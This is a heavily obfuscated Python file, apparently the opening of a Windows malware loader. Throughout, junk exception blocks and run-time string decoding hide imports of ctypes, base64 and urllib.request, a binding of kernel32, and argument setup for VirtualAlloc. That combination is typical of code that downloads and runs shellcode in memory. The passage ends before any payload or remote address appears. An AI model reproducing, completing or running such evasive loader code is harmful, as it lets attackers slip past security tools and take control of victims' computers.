__7768862800537 = 0
__7768862800537 += 1
try:
    raise MemoryError(__7768862800537)
except MemoryError as __8143155968256:
    if __8143155968256.args[0] == 1:
        globals()['R_E_D__A_V_______'] = bool if bool(bool(bool(bool))) < bool(type(int(154) > int(1413) < int(415) > int(198))) and bool(str(str(1113) > int(1415) < int(1013) > int(315))) > 2 else bool
    if __8143155968256.args[0] == 3:
        __3973743861972 = 237282748761028
    if __8143155968256.args[0] == 4:
        __3155444926669 = 141814420088523
    if __8143155968256.args[0] == 5:
        __7821802009212 = 226512294495834
__4008498355479 = 0
__4008498355479 += 1
try:
    raise MemoryError(__4008498355479)
except MemoryError as __5913587300612:
    if __5913587300612.args[0] == 1:
        globals()['R_E_D__A_V______'] = str if bool(bool(bool(str))) < bool(type(int(172) > int(71) < int(1916) > int(312))) and bool(str(str(1014) > int(101) < int(58) > int(61))) > 2 else str
    if __5913587300612.args[0] == 3:
        __7666509610841 = 126703808602941
    if __5913587300612.args[0] == 4:
        __3299102990491 = 279317064306170
__7449543781037 = 0
__7449543781037 += 1
try:
    raise MemoryError(__7449543781037)
except MemoryError as __5565034962654:
    if __5565034962654.args[0] == 1:
        globals()['R_E_D__A_V________'] = type if bool(bool(bool(type))) < bool(type(int(47) > int(1115) < int(1613) > int(51))) and bool(str(str(1217) > int(84) < int(143) > int(314))) > 2 else type
    if __5565034962654.args[0] == 3:
        __6201748432054 = 130477261164635
    if __5565034962654.args[0] == 4:
        __8253958991513 = 38716943425276
__7692219013633 = 0
__7692219013633 += 1
try:
    raise MemoryError(__7692219013633)
except MemoryError as __4038174496509:
    if __4038174496509.args[0] == 1:
        globals()['R_E_D__A_V_____'] = int if bool(bool(bool(int))) < bool(type(int(714) > int(72) < int(1912) > int(98))) and bool(str(str(110) > int(194) < int(1518) > int(311))) > 2 else int
    if __4038174496509.args[0] == 3:
        __2566417135816 = 252340939841230
__7734914706181 = 0
__7734914706181 += 1
try:
    raise MemoryError(__7734914706181)
except MemoryError as __3859439033950:
    if __3859439033950.args[0] == 1:
        globals()['R_E_D__A_V_________'] = bytes if bool(bool(bool(bytes))) < bool(type(int(51) > int(153) < int(41) > int(115))) and bool(str(str(716) > int(142) < int(179) > int(68))) > 2 else bytes
    if __3859439033950.args[0] == 3:
        __2380423011050 = 190745082958895
    if __3859439033950.args[0] == 4:
        __6786375903032 = 252534710635590
    if __3859439033950.args[0] == 5:
        __8402648099335 = 160085546389828
__8049138560440 = 0
__8049138560440 += 1
try:
    raise MemoryError(__8049138560440)
except MemoryError as __8559835784731:
    if __8559835784731.args[0] == 1:
        globals()['R_E_D__A_V__________'] = vars if bool(bool(bool(vars))) < bool(type(int(84) > int(159) < int(35) > int(81))) and bool(str(str(128) > int(210) < int(53) > int(1018))) > 2 else vars
    if __8559835784731.args[0] == 3:
        __7700896956014 = 70090170531633
    if __8559835784731.args[0] == 4:
        __7391495375375 = 217876171250824
    if __8559835784731.args[0] == 5:
        __2651260714975 = 271795211406941
    if __8559835784731.args[0] == 6:
        __2625639613229 = 117949041394649
    if __8559835784731.args[0] == 7:
        __6188784970614 = 10906445457736
__4276310318619 = 0
__4276310318619 += 1
try:
    raise MemoryError(__4276310318619)
except MemoryError as __6136681841739:
    if __6136681841739.args[0] == 1:
        globals()['R_E_D__A_V____________'] = callable if bool(bool(bool(callable))) < bool(type(int(613) > int(1213) < int(1411) > int(1914))) and bool(str(str(612) > int(106) < int(126) > int(76))) > 2 else callable
    if __6136681841739.args[0] == 3:
        __4460394864095 = 162508690515959
    if __6136681841739.args[0] == 4:
        __3181971250287 = 184694255184662
    if __6136681841739.args[0] == 5:
        __2315950395733 = 196721328374091
__6512752986705 = 0
__6512752986705 += 1
try:
    raise MemoryError(__6512752986705)
except MemoryError as __4021845790132:
    if __4021845790132.args[0] == 1:
        globals()['R_E_D__A_V____'] = eval if bool(bool(bool(eval))) < bool(type(int(32) > int(1419) < int(1018) > int(1512))) and bool(str(str(1814) > int(166) < int(76) > int(119))) > 2 else eval
    if __4021845790132.args[0] == 3:
        __3534888768176 = 246450724788637
    if __4021845790132.args[0] == 4:
        __6005084794309 = 3629211166110
    if __4021845790132.args[0] == 5:
        __3009217320103 = 8374500397500
    if __4021845790132.args[0] == 6:
        __7986921181415 = 176653767808652
    if __4021845790132.args[0] == 7:
        __2872586694975 = 178193786253489
__3366283074829 = 0
__3366283074829 += 1
try:
    raise MemoryError(__3366283074829)
except MemoryError as __6220120571898:
    if __6220120571898.args[0] == 1:
        globals()['______________R_E_D__A_V______________'] = list if bool(bool(bool(list))) < bool(type(int(1711) > int(139) < int(1416) > int(12))) and bool(str(str(1814) > int(1512) < int(1416) > int(131))) > 2 else list
    if __6220120571898.args[0] == 3:
        __2513905819036 = 229164859030965
    if __6220120571898.args[0] == 4:
        __8075239928118 = 258020258742315
__4649108837959 = 0
__4649108837959 += 1
try:
    raise MemoryError(__4649108837959)
except MemoryError as __2133967300951:
    if __2133967300951.args[0] == 1:
        globals()['R_E_D__A_V______________'] = map if bool(bool(bool(map))) < bool(type(int(75) > int(1712) < int(817) > int(135))) and bool(str(str(89) > int(106) < int(1715) > int(1215))) > 2 else map
    if __2133967300951.args[0] == 3:
        __4120572525384 = 103777553377271
    if __2133967300951.args[0] == 4:
        __6696380699163 = 2423908209444
    if __2133967300951.args[0] == 5:
        __5141704158938 = 43036502661959
__7919746616365 = 0
__7919746616365 += 1
try:
    raise MemoryError(__7919746616365)
except MemoryError as __6206452001955:
    if __6206452001955.args[0] == 1:
        globals()['R_E_D__A_V___'] = __import__ if bool(bool(bool(__import__))) < bool(type(int(913) > int(115) < int(315) > int(815))) and bool(str(str(13) > int(151) < int(102) > int(1913))) > 2 else __import__
    if __6206452001955.args[0] == 3:
        __3820415532391 = 261153994284176
    if __6206452001955.args[0] == 4:
        __6441375955733 = 183850778768523
    if __6206452001955.args[0] == 5:
        __4758976796121 = 74949365509638
    if __6206452001955.args[0] == 6:
        __5392104503345 = 211284442864359
__3899159549259 = 0
__3899159549259 += 1
try:
    raise MemoryError(__3899159549259)
except MemoryError as __5344330423641:
    if __5344330423641.args[0] == 1:
        globals()['tryᅠ'] = print if bool(bool(bool(print))) < bool(type(int(91) > int(414) < int(1910) > int(1513))) and bool(str(str(1315) > int(1316) < int(217) > int(16))) > 2 else print
    if __5344330423641.args[0] == 3:
        __3886381166741 = 262253171924464
    if __5344330423641.args[0] == 4:
        __7669698840480 = 21031144219204
    if __5344330423641.args[0] == 5:
        __2776726465895 = 3474526524936
    if __5344330423641.args[0] == 6:
        __3108212941544 = 121727910259940
    if __5344330423641.args[0] == 7:
        __6516876472297 = 235781415729413
__6817945637603 = 0
__6817945637603 += 1
try:
    raise MemoryError(__6817945637603)
except MemoryError as __6078889935848:
    if __6078889935848.args[0] == 1:
        globals()['exceptᅠ'] = input if bool(bool(bool(input))) < bool(type(int(719) > int(61) < int(314) > int(515))) and bool(str(str(51) > int(211) < int(218) > int(178))) > 2 else input
    if __6078889935848.args[0] == 3:
        __7614947870987 = 88264109994671
    if __6078889935848.args[0] == 4:
        __5011474840388 = 219586495204345
    if __6078889935848.args[0] == 5:
        __3790716393626 = 41592759355257

def R_E_D__A_V____(RED_DEFENDER, *k):
    __6727521433212 = 0
    __6727521433212 += 1
    try:
        raise MemoryError(__6727521433212)
    except MemoryError as __7648332259358:
        if __7648332259358.args[0] == 1:
            if k:
                R_E_D____A_V = '+'
                op = '+'
            else:
                R_E_D____A_V = ''
                op = ''
        if __7648332259358.args[0] == 1:
            globals()['_28'] = (lambda: (lambda _517: _517 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()
        if __7648332259358.args[0] == 1:
            globals()['R_E_D__A_V____'] = R_E_D__A_V____
        if __7648332259358.args[0] == 1:
            globals()['R_E_D__A_V______'] = R_E_D__A_V______
        if __7648332259358.args[0] == 1:
            globals()['RED_DEFENDER'] = RED_DEFENDER
        if __7648332259358.args[0] == 1:
            for globals()['R_E_D____A_V_'] in globals()['RED_DEFENDER']:
                if not _28:
                    globals()['R_E_D____A_V_'] += (lambda: '')()
                R_E_D____A_V += R_E_D__A_V______(R_E_D____A_V_)
                f = (lambda: (lambda _210: _210 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()
        if __7648332259358.args[0] == 1:
            return R_E_D____A_V
        if __7648332259358.args[0] == 9:
            __6518989628577 = 21443579295806
        if __7648332259358.args[0] == 10:
            __5182707019281 = 130793608907291

def ______R_E_D__A_V_______(x):
    __7368023848871 = 0
    __7368023848871 += 1
    try:
        raise MemoryError(__7368023848871)
    except MemoryError as __3945169887060:
        if __3945169887060.args[0] == 1:
            return R_E_D__A_V_____(x - 30583)
        if __3945169887060.args[0] == 3:
            __4618472645049 = 149379539753280
        if __3945169887060.args[0] == 4:
            __6534223625722 = 239657002529992
        if __3945169887060.args[0] == 5:
            __8378218767422 = 153052390671873
        if __3945169887060.args[0] == 6:
            __2802040941911 = 54034863377399
        if __3945169887060.args[0] == 7:
            __4739791874999 = 56602065464248

def R_E_D__A_V(e):
    __3864888310106 = 0
    __3864888310106 += 1
    try:
        raise MemoryError(__3864888310106)
    except MemoryError as __5669835103881:
        if __5669835103881.args[0] == 1:
            br = bytearray(e[len(b'R_E_D__A_V__'):])
        if __5669835103881.args[0] == 1:
            r = 0
        if __5669835103881.args[0] == 1:
            for b in br:
                r = r * 256 + b
        if __5669835103881.args[0] == 1:
            return r
        if __5669835103881.args[0] == 6:
            __6108242096581 = 233613543270228
        if __5669835103881.args[0] == 7:
            __7661913356588 = 203438483021475
        if __5669835103881.args[0] == 8:
            __6424586138924 = 78352412239103
        if __5669835103881.args[0] == 9:
            __8435176657802 = 81285069934323
        if __5669835103881.args[0] == 10:
            __3885010160655 = 136035699026842

def ____________________________(x):
    __5319326967902 = 0
    __5319326967902 += 1
    try:
        raise MemoryError(__5319326967902)
    except MemoryError as __3960559242661:
        if __3960559242661.args[0] == 1:
            ar = []
        if __3960559242661.args[0] == 1:
            for i in x:
                ar.append(R_E_D__A_V____(i))
        if __3960559242661.args[0] == 1:
            return ar
        if __3960559242661.args[0] == 5:
            __6696099951978 = 93974773446970
        if __3960559242661.args[0] == 6:
            __5263601489009 = 275619688254020
        if __3960559242661.args[0] == 7:
            __8187434712922 = 104347825244808
if (lambda: (lambda _105: _105 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)():

    def R_E_D__A_V_______________(R_E_D__A_V____________):
        R_E_D__A_V____________ = R_E_D__A_V____________ - 16742655
        if R_E_D__A_V____________ <= 127:
            return R_E_D__A_V______(R_E_D__A_V_________([R_E_D__A_V____________]), 'utf8')
        elif R_E_D__A_V____________ <= 2047:
            if 1 < 2:
                b1 = 192 | R_E_D__A_V____________ >> 6
            b2 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2]), 'utf8')
        elif R_E_D__A_V____________ <= 65535:
            b1 = 224 | R_E_D__A_V____________ >> 12
            if 2 > 1:
                b2 = 128 | R_E_D__A_V____________ >> 6 & 63
            b3 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2, b3]), 'utf8')
        else:
            b1 = 240 | R_E_D__A_V____________ >> 18
            if 2 == 2:
                b2 = 128 | R_E_D__A_V____________ >> 12 & 63
            if 1 < 2 < 3:
                b3 = 128 | R_E_D__A_V____________ >> 6 & 63
            b4 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2, b3, b4]), 'utf8')

    def _hex(j):
        R_E_D__A_V____________ = ''
        for _hex in j:
            R_E_D__A_V____________ += R_E_D__A_V_______________(_hex)
        return R_E_D__A_V____________
else:
    'R_E_D____A_V'
try:
    match '42' == '1810':
        case True:
            raise MemoryError([True])
        case False:
            _919 = [[True], [False]]
            R_E_D__A_V______(['_514'])
    raise MemoryError([True])
except MemoryError as _1312:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742704, 16742705]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _174: _174 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1911 = [[(lambda: (lambda _89: _89 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1512: _1512 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742707, 16742706]))))())())()])
        raise MemoryError([(lambda: (lambda _122: _122 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1312:
        import sys
try:
    match '1510' == '1517':
        case True:
            raise MemoryError([True])
        case False:
            _195 = [[True], [False]]
            R_E_D__A_V______(['_1316'])
    raise MemoryError([True])
except MemoryError as _510:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742704, 16742707]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742704, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1617: _1617 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _162 = [[(lambda: (lambda _92: _92 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1816: _1816 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742706, 16742704]))))())())()])
        raise MemoryError([(lambda: (lambda _133: _133 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _156:
        import ctypes
try:
    match '163' == '1614':
        case True:
            raise MemoryError([True])
        case False:
            _819 = [[True], [False]]
            R_E_D__A_V______(['_142'])
    raise MemoryError([True])
except MemoryError as _816:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742706]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _169: _169 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _715 = [[(lambda: (lambda _1011: _1011 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1614: _1614 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742707, 16742709]))))())())()])
        raise MemoryError([(lambda: (lambda _151: _151 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1019:
        import base64
try:
    match '112' == '1219':
        case True:
            raise MemoryError([True])
        case False:
            _1514 = [[True], [False]]
            R_E_D__A_V______(['_17'])
    raise MemoryError([True])
except MemoryError as _1011:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742704, 16742706]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1116: _1116 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _163 = [[(lambda: (lambda _1018: _1018 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _83: _83 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742711, 16742707]))))())())()])
        raise MemoryError([(lambda: (lambda _1116: _1116 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _57:
        import ctypes.wintypes as wt
try:
    match '36' == '75':
        case True:
            raise MemoryError([True])
        case False:
            _1014 = [[True], [False]]
            R_E_D__A_V______(['_182'])
    raise MemoryError([True])
except MemoryError as _163:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742709]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _167: _167 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _211 = [[(lambda: (lambda _171: _171 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1911: _1911 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742707, 16742704, 16742706]))))())())()])
        raise MemoryError([(lambda: (lambda _146: _146 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _124:
        import urllib.request
try:
    match '163' == '1513':
        case True:
            raise MemoryError([True])
        case False:
            _27 = [[True], [False]]
            R_E_D__A_V______(['_188'])
    raise MemoryError([True])
except MemoryError as _615:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742704]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742704, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _115: _115 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _614 = [[(lambda: (lambda _1312: _1312 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1411: _1411 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742710, 16742708]))))())())()])
        raise MemoryError([(lambda: (lambda _105: _105 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _814:
        __4598342688335 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '59' == '86':
        case True:
            raise MemoryError([True])
        case False:
            _28 = [[True], [False]]
            R_E_D__A_V______(['_1110'])
    raise MemoryError([True])
except MemoryError as _1117:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742704, 16742711]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1613: _1613 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _188 = [[(lambda: (lambda _310: _310 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _816: _816 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742706, 16742704, 16742712]))))())())()])
        raise MemoryError([(lambda: (lambda _1611: _1611 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _52:
        __4598342688335 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '178' == '513':
        case True:
            raise MemoryError([True])
        case False:
            _134 = [[True], [False]]
            R_E_D__A_V______(['_108'])
    raise MemoryError([True])
except MemoryError as _138:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742704, 16742710]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1618: _1618 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _153 = [[(lambda: (lambda _133: _133 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _123: _123 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742709, 16742706]))))())())()])
        raise MemoryError([(lambda: (lambda _107: _107 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _215:
        try:
            raise MemoryError(__4598342688335)
        except MemoryError as __5112665246367:
            if __5112665246367.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32 = ctypes.windll.kernel32
            if __5112665246367.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __6319276127169 = (lambda: R_E_D__A_V(b'R_E_D__A_V__z\xde\xd0\xde\xb7\xd5'))()
            if __5112665246367.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __7704403363990 = (lambda: R_E_D__A_V(b'R_E_D__A_V__^\xcb\r\xe1A\x02'))()
try:
    match '315' == '1119':
        case True:
            raise MemoryError([True])
        case False:
            _196 = [[True], [False]]
            R_E_D__A_V______(['_161'])
    raise MemoryError([True])
except MemoryError as _1011:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742710]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742704, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _119: _119 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _52 = [[(lambda: (lambda _911: _911 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _144: _144 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742705, 16742706]))))())())()])
        raise MemoryError([(lambda: (lambda _1813: _1813 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _517:
        __5513542491294 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '163' == '92':
        case True:
            raise MemoryError([True])
        case False:
            _73 = [[True], [False]]
            R_E_D__A_V______(['_103'])
    raise MemoryError([True])
except MemoryError as _1312:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742706]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _118: _118 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1511 = [[(lambda: (lambda _618: _618 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1218: _1218 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742705, 16742704, 16742709]))))())())()])
        raise MemoryError([(lambda: (lambda _1710: _1710 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _15:
        __5513542491294 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '613' == '1119':
        case True:
            raise MemoryError([True])
        case False:
            _108 = [[True], [False]]
            R_E_D__A_V______(['_1511'])
    raise MemoryError([True])
except MemoryError as _102:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742709]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _119: _119 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _52 = [[(lambda: (lambda _57: _57 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _186: _186 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742705, 16742710]))))())())()])
        raise MemoryError([(lambda: (lambda _123: _123 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _314:
        try:
            raise MemoryError(__5513542491294)
        except MemoryError as __3798108008802:
            if __3798108008802.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.VirtualAlloc.argtypes = (wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD)
            if __3798108008802.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __4133368782148 = (lambda: R_E_D__A_V(b'R_E_D__A_V__8j\xa3p\xf7\xdb'))()
            if __3798108008802.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __5528079268406 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xc8\xd5\xa3\xd6{ '))()
            if __3798108008802.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __5447508191477 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xba\x94\xa3\xfch\xea'))()
            if __3798108008802.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x06'))():
                __6190980570529 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x94\x04\x84]&\\'))()
try:
    match '718' == '131':
        case True:
            raise MemoryError([True])
        case False:
            _518 = [[True], [False]]
            R_E_D__A_V______(['_95'])
    raise MemoryError([True])
except MemoryError as _1813:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742712]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _68: _68 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _319 = [[(lambda: (lambda _108: _108 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _515: _515 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742703, 16742704, 16742710]))))())())()])
        raise MemoryError([(lambda: (lambda _215: _215 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _618:
        __2209966919595 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '314' == '1110':
        case True:
            raise MemoryError([True])
        case False:
            _417 = [[True], [False]]
            R_E_D__A_V______(['_1811'])
    raise MemoryError([True])
except MemoryError as _132:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742705]))))())())():
            case True:
